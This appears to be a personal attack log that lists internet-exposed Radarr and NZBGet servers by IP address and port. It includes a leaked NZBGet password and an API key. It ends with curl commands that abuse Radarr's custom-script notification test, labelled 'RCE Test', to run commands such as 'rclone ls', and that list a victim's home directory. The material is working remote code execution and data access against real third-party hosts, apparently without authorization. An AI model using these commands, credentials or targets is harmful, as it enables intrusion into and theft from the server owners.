Random Oracle US IP jiska Radarr khul rha hai:
132.226.58.205:7878

Looks person with rich hardware (multiple news servers found) has ~46 TB storage - maybe a video editor, windows user?
67.1.111.121:7878
Nzbget:
67.1.111.121:6789
nzbget:54dW5*G!N^

250+ TB ????? 
165.140.117.181:7878


4.0.15



curl -s -X POST "http://165.140.117.181:7878/api/v3/notification/test?apiKey=5b067b720645400caa6deaa0bf6691c1" -H "Content-Type: application/json" -d '{
    "name": "RCE Test",
    "implementation": "CustomScript",
    "configContract": "CustomScriptSettings",
    "fields": [
      {"name": "path", "value": "/home/../bin/cp"}
    ]
  }'

curl -s -X POST "http://165.140.117.181:7878/api/v3/notification/test?apiKey=5b067b720645400caa6deaa0bf6691c1" -H "Content-Type: application/json" -d '{
    "name": "RCE Test",
    "implementation": "CustomScript",
    "configContract": "CustomScriptSettings",
    "fields": [
      {"name": "path", "value": "/home/deafcon/bin/rclone ls"}
    ]
  }'

curl 'http://165.140.117.181:7878/api/v3/filesystem?path=/home/deafcon/&includeFiles=true&apikey=5b067b720645400caa6deaa0bf6691c1'
